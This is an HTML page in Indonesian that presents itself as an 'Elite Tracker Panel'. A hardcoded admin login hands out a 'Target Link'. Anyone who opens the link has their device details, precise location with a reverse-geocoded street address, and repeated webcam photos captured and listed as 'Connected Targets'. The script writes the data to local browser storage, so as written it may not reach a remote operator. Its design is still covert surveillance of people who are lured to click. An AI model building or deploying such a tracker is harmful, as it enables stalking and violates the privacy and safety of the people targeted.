<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Elite Tracker Panel - CodingX</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        /* --- CSS ASLI ANDA (DIPERTAHANKAN TOTAL) --- */
        :root {
            --bg-main: #0a0a0c;
            --panel-bg: rgba(30, 30, 35, 0.7);
            --accent-glow: #00f2ff;
            --accent-dark: #0066ff;
            --border-glass: rgba(255, 255, 255, 0.1);
        }

        body {
            margin: 0; padding: 0; background-color: var(--bg-main);
            background-image: radial-gradient(circle at top right, #1a1a2e, transparent);
            color: white; font-family: 'Inter', sans-serif;
            display: flex; justify-content: center; min-height: 100vh;
        }

        .phone-frame { width: 100%; max-width: 420px; padding: 20px; box-sizing: border-box; position: relative; }

        .header-profile {
            background: var(--panel-bg); backdrop-filter: blur(10px);
            border-radius: 24px; padding: 25px; border: 1px solid var(--border-glass);
            text-align: center; margin-bottom: 25px; position: relative; overflow: hidden;
        }

        .exp-timer {
            position: absolute; top: 5px; right: 15px;
            font-family: 'Orbitron'; font-size: 9px; color: #ff0055;
            background: rgba(0,0,0,0.9); padding: 4px 10px; border-radius: 8px;
            border: 1px solid #ff0055; z-index: 999;
            box-shadow: 0 0 10px rgba(255, 0, 85, 0.5);
        }

        .logo-main {
            width: 90px; height: 90px; border-radius: 50%; background: #000;
            margin: 0 auto 15px; display: flex; justify-content: center; align-items: center;
            border: 2px solid var(--accent-glow); box-shadow: 0 0 20px var(--accent-dark);
        }
        .logo-main svg { width: 50px; fill: var(--accent-glow); }

        .header-profile h1 {
            font-family: 'Orbitron', sans-serif; font-size: 20px; letter-spacing: 3px;
            margin: 10px 0; text-transform: uppercase; color: white;
        }

        .status-badge {
            display: inline-flex; align-items: center; background: rgba(0, 255, 100, 0.1);
            color: #00ff64; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold;
        }

        .control-panel {
            background: var(--panel-bg); backdrop-filter: blur(15px);
            border-radius: 24px; padding: 20px; border: 1px solid var(--border-glass);
            margin-bottom: 20px;
        }

        .label-style { font-size: 11px; text-transform: uppercase; color: #888; margin-bottom: 10px; display: block; }

        .input-group {
            background: rgba(0,0,0,0.3); border-radius: 12px; padding: 10px;
            border: 1px solid #333; display: flex; align-items: center; justify-content: space-between;
        }
        .input-group input { background: transparent; border: none; color: #fff; width: 70%; outline: none; }

        .btn-action {
            background: linear-gradient(135deg, var(--accent-glow), var(--accent-dark));
            color: #000; border: none; padding: 10px 18px; border-radius: 10px;
            font-weight: 800; font-size: 11px; cursor: pointer;
            box-shadow: 0 0 15px rgba(0, 242, 255, 0.4);
        }

        .target-folder {
            background: linear-gradient(90deg, #1e1e24, #121216);
            border-radius: 15px; padding: 18px; margin-top: 10px;
            display: flex; align-items: center; justify-content: space-between;
            border-left: 4px solid var(--accent-glow);
        }

        .folder-info { display: flex; align-items: center; flex-grow: 1; cursor: pointer; }
        .robotic-svg { width: 24px; height: 24px; fill: var(--accent-glow); margin-right: 15px; }
        .trash-svg { width: 18px; height: 18px; fill: #ff4444; }

        #login-gate {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: var(--bg-main); z-index: 10000; display: flex; justify-content: center; align-items: center;
        }
        
        #gallery-overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: var(--bg-main); z-index: 10001; padding: 20px; box-sizing: border-box; overflow-y: auto;
        }
        .grid-photos { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-top: 20px; }
        .grid-photos img { width: 100%; border-radius: 15px; border: 1px solid #333; }

        /* SIDEBAR */
        #side-nav {
            position: fixed; top: 0; left: -300px; width: 280px; height: 100%;
            background: #0f0f12; z-index: 20000; transition: 0.4s;
            border-right: 1px solid var(--border-glass);
        }
        #side-nav.active { left: 0; }
        .nav-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.7); z-index: 15000; display: none;
        }
        .hamburger {
            position: absolute; top: 35px; left: 40px; z-index: 1000;
            background: var(--panel-bg); border: 1px solid var(--border-glass);
            padding: 10px; border-radius: 12px; cursor: pointer;
        }

        .nav-item {
            padding: 15px; display: flex; align-items: center; gap: 15px;
            color: #ccc; text-decoration: none; border-radius: 12px; transition: 0.3s;
            margin: 0 15px 5px;
        }
        .nav-item:hover { background: rgba(0, 242, 255, 0.1); color: var(--accent-glow); }
        .nav-item svg { width: 20px; fill: var(--accent-glow); }

        /* INFO DESIGN */
        .info-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
        .info-title {
            font-family: 'Orbitron'; font-size: 13px; color: var(--accent-glow); letter-spacing: 2px;
        }
        .info-row { 
            display: flex; justify-content: space-between; align-items: center; 
            padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 11px;
        }
        .info-label { color: #888; }
        .info-value { color: #fff; text-align: right; width: 60%; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }

        .btn-back {
            display: flex; align-items: center; gap: 10px;
            background: rgba(255, 255, 255, 0.05); color: #fff;
            border: 1px solid var(--border-glass); padding: 10px 20px;
            border-radius: 50px; cursor: pointer; font-family: 'Orbitron';
            font-size: 10px; transition: 0.3s;
        }
        .btn-back:hover { background: var(--accent-glow); color: #000; }

        .icon-copy-master {
            cursor: pointer; padding: 8px; border-radius: 10px;
            background: rgba(0, 242, 255, 0.1); border: 1px solid var(--border-glass);
            transition: 0.3s; display: flex; align-items: center; justify-content: center;
        }
        .icon-copy-master:hover { background: var(--accent-glow); }
        .icon-copy-master:hover svg { fill: #000; }
    </style>
</head>
<body>

<div id="side-nav">
    <div style="padding: 40px 20px; text-align: center;">
        <div class="logo-main" style="width: 70px; height: 70px;">
            <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
        </div>
        <b style="font-family: 'Orbitron'; font-size: 16px;">R_hmt</b>
        <p style="font-size: 10px; color: var(--accent-glow);">Elite Member</p>
    </div>
    <a href="#" class="nav-item">
        <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM9 11H7V9h2v2zm4 0h-2V9h2v2zm4 0h-2V9h2v2z"/></svg> Contact CS
    </a>
    <a href="#" class="nav-item">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14h-2V8h2v8zm4 0h-2V8h2v8z"/></svg> Saluran
    </a>
    <a href="#" class="nav-item">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.23 1.58-.8 5.42-1.08 7.34-.12.82-.42 1.1-.71 1.13-.64.06-1.13-.42-1.75-.82-.98-.63-1.54-1.02-2.48-1.64-1.09-.71-.38-1.1.24-1.74.16-.17 2.97-2.72 3.02-2.94.01-.03.01-.15-.06-.21s-.17-.04-.25-.02c-.11.02-1.78 1.13-5.05 3.34-.48.33-.91.49-1.3.48-.43-.01-1.26-.24-1.87-.44-.75-.25-1.34-.38-1.29-.81.03-.22.33-.45.91-.7 3.56-1.55 5.94-2.57 7.12-3.07 3.41-1.42 4.12-1.66 4.58-1.67.1 0 .33.02.48.15.12.1.16.23.18.33 0 .07.01.21 0 .28z"/></svg> Telegram
    </a>
    <a href="#" class="nav-item">
        <svg viewBox="0 0 24 24"><path d="M12.53.02C13.84 0 15.14.01 16.44 0c.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-1.22-.32-2.57-.17-3.6.48-.99.63-1.61 1.76-1.63 2.93-.01.93.39 1.84 1.05 2.48.75.76 1.82 1.11 2.89 1.03 1.2-.1 2.37-.74 2.99-1.73.4-.6.64-1.31.67-2.03.03-3.95.01-7.9.02-11.85z"/></svg> TikTok
    </a>
</div>
<div class="nav-overlay" id="navOver" onclick="toggleNav()"></div>

<div id="login-gate">
    <div class="control-panel" style="width: 80%; text-align: center;">
        <h2 style="font-family: 'Orbitron'; font-size: 14px; color: var(--accent-glow);">MASTER ACCESS</h2>
        <input type="text" id="user-in" class="input-group" style="width: 100%; margin-bottom: 10px; padding: 12px; box-sizing: border-box; background: #000; color: #fff;" placeholder="Username">
        <input type="password" id="pass-in" class="input-group" style="width: 100%; margin-bottom: 20px; padding: 12px; box-sizing: border-box; background: #000; color: #fff;" placeholder="Password">
        <button class="btn-action" style="width: 100%;" onclick="auth()">LOGIN SYSTEM</button>
    </div>
</div>

<div class="phone-frame" id="admin-view" style="display:none;">
    <div class="hamburger" id="hamBtn" onclick="toggleNav()">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
    </div>
    <div class="header-profile">
        <div class="exp-timer" id="exp-display">EXP: 60m 0s</div>
        <div class="logo-main"><svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5" fill="none" stroke="cyan" stroke-width="2"/></svg></div>
        <h1>ONDEV PANEL</h1>
        <div class="status-badge">‚óè TERMINAL ACTIVE</div>
    </div>
    <div class="control-panel">
        <span class="label-style">Target Link</span>
        <div class="input-group">
            <input type="text" id="gen-url" readonly>
            <div onclick="copyLinkOnly()" style="cursor:pointer;"><svg width="20" height="20" viewBox="0 0 24 24" fill="cyan"><path d="M16 1H4C2.9 1 2 1.9 2 3V17H4V3H16V1ZM19 5H8C6.9 5 6 5.9 6 7V21C6 22.1 6.9 23 8 23H19C20.1 23 21 22.1 21 21V7C21 5.9 20.1 5 19 5ZM19 21H8V7H19V21Z"/></svg></div>
        </div>
    </div>
    <div class="control-panel">
        <span class="label-style">Connected Targets</span>
        <div id="target-list"></div>
    </div>
</div>

<div id="gallery-overlay">
    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
        <button class="btn-back" onclick="closeFolder()">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg> BACK
        </button>
        <div class="icon-copy-master" onclick="copyAllTargetData()">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="cyan"><path d="M16 1H4C2.9 1 2 1.9 2 3V17H4V3H16V1ZM19 5H8C6.9 5 6 5.9 6 7V21C6 22.1 6.9 23 8 23H19C20.1 23 21 22.1 21 21V7C21 5.9 20.1 5 19 5ZM19 21H8V7H19V21Z"/></svg>
        </div>
    </div>
    
    <div class="info-title" style="margin-bottom:10px;">TARGET ANALYSIS</div>
    <div id="info-container" style="background:var(--panel-bg); padding:15px; border-radius:20px; border:1px solid var(--border-glass); margin-bottom: 20px;"></div>
    
    <div class="info-title">CAPTURED PHOTOS</div>
    <div class="grid-photos" id="photo-grid"></div>
</div>

<script>
    const idParam = new URLSearchParams(window.location.search).get('id');
    const DB_KEY = 'ondev_v21_final';

    if(idParam) {
        document.getElementById('login-gate').style.display = 'none';
        startCapture(idParam);
    }

    function toggleNav() {
        const side = document.getElementById('side-nav');
        const over = document.getElementById('navOver');
        side.classList.toggle('active');
        over.style.display = side.classList.contains('active') ? 'block' : 'none';
    }

    function auth() {
        const u = document.getElementById('user-in').value;
        const p = document.getElementById('pass-in').value;
        if(u === 'ondev' && p === 'ondev') {
            if(!localStorage.getItem(DB_KEY+'_time')) localStorage.setItem(DB_KEY+'_time', new Date().getTime() + 3600000);
            document.getElementById('login-gate').style.display = 'none';
            document.getElementById('admin-view').style.display = 'block';
            startAdmin();
        } else { alert('ACCESS DENIED'); }
    }

    function startAdmin() {
        const url = window.location.href.split('?')[0];
        document.getElementById('gen-url').value = url + "?id=" + Math.floor(1000 + Math.random() * 9000);
        renderList();
        setInterval(renderList, 4000);
        setInterval(() => {
            const d = localStorage.getItem(DB_KEY+'_time') - new Date().getTime();
            if(d <= 0) location.reload();
            document.getElementById('exp-display').innerText = `EXP: ${Math.floor(d/60000)}m ${Math.floor((d%60000)/1000)}s`;
        }, 1000);
    }

    function renderList() {
        const db = JSON.parse(localStorage.getItem(DB_KEY+'_db') || '{}');
        const list = document.getElementById('target-list');
        list.innerHTML = '';
        Object.keys(db).reverse().forEach((id, i) => {
            const div = document.createElement('div');
            div.className = 'target-folder';
            div.innerHTML = `<div class="folder-info" onclick="openFolder('${id}')">
                <svg class="robotic-svg" viewBox="0 0 24 24"><path d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>
                <div class="folder-text"><b>TARGET #${i+1}</b><br><small>${db[id].info.time}</small></div>
            </div>
            <button onclick="delT('${id}')" style="background:none;border:none;"><svg class="trash-svg" viewBox="0 0 24 24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg></button>`;
            list.appendChild(div);
        });
    }

    let currentTargetData = "";

    function openFolder(id) {
        document.getElementById('hamBtn').style.display = 'none';
        const d = JSON.parse(localStorage.getItem(DB_KEY+'_db'))[id].info;
        const ph = JSON.parse(localStorage.getItem(DB_KEY+'_db'))[id].photos;
        
        currentTargetData = `Bahasa: ${d.lang}\nPlatform: ${d.plat}\nRAM: ${d.ram} GB\nCPU: ${d.cpu}\nBattery: ${d.bat}\nWaktu: ${d.time}\nNegara: ${d.neg}\nAlamat: ${d.addr}\nMaps: http://google.com/maps?q=${d.lat},${d.lon}`;

        const row = (label, val) => `
            <div class="info-row">
                <span class="info-label">${label}:</span>
                <span class="info-value">${val}</span>
            </div>`;

        document.getElementById('info-container').innerHTML = 
            row('Bahasa', d.lang) +
            row('Platform', d.plat) +
            row('Ram', d.ram + ' GB') +
            row('Cpu', d.cpu) +
            row('Battery', d.bat) +
            row('Waktu akses', d.time) +
            row('Negara', d.neg) +
            row('Alamat lengkap', d.addr) +
            `<div style="padding-top:15px"><button class="btn-action" style="width:100%" onclick="window.open('http://google.com/maps?q=${d.lat},${d.lon}')">VIEW GOOGLE MAPS</button></div>`;
        
        document.getElementById('photo-grid').innerHTML = ph.map(p => `<img src="${p}">`).join('');
        document.getElementById('gallery-overlay').style.display = 'block';
    }

    function copyAllTargetData() {
        navigator.clipboard.writeText(currentTargetData);
        alert('INFO COPIED!');
    }

    function copyLinkOnly() {
        const e = document.getElementById('gen-url'); e.select(); document.execCommand('copy'); alert('URL Copied');
    }

    function delT(id) {
        if(confirm('Hapus?')){
            let db = JSON.parse(localStorage.getItem(DB_KEY+'_db'));
            delete db[id];
            localStorage.setItem(DB_KEY+'_db', JSON.stringify(db));
            renderList();
        }
    }

    function closeFolder() {
        document.getElementById('gallery-overlay').style.display = 'none';
        document.getElementById('hamBtn').style.display = 'block';
    }

    function startCapture(id) {
        let store = { photos: [], info: { 
            time: new Date().toLocaleString(), plat: navigator.platform, lang: navigator.language, 
            ram: navigator.deviceMemory || '?', cpu: navigator.hardwareConcurrency || '?', bat: '..', 
            neg: '..', addr: '..', lat: 0, lon: 0 
        }};

        if(navigator.getBattery) navigator.getBattery().then(b => { 
            store.info.bat = Math.round(b.level*100)+'%'; 
            sync(id, store);
        });

        navigator.geolocation.getCurrentPosition(p => {
            store.info.lat = p.coords.latitude; store.info.lon = p.coords.longitude;
            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${p.coords.latitude}&lon=${p.coords.longitude}`)
            .then(r => r.json()).then(res => {
                store.info.neg = res.address.country || '..';
                store.info.addr = res.display_name;
                sync(id, store);
            });
        }, null, {enableHighAccuracy:true});

        navigator.mediaDevices.getUserMedia({video:true}).then(s => {
            const v = document.createElement('video'); v.srcObject = s; v.play();
            setInterval(() => {
                const c = document.createElement('canvas'); c.width = 400; c.height = 300;
                c.getContext('2d').drawImage(v, 0, 0, 400, 300);
                store.photos.unshift(c.toDataURL('image/jpeg', 0.4));
                if(store.photos.length > 5) store.photos.pop();
                sync(id, store);
            }, 5000);
        });
    }

    function sync(id, data) {
        let db = JSON.parse(localStorage.getItem(DB_KEY+'_db') || '{}');
        db[id] = data;
        localStorage.setItem(DB_KEY+'_db', JSON.stringify(db));
    }
</script>
</body>
</html>
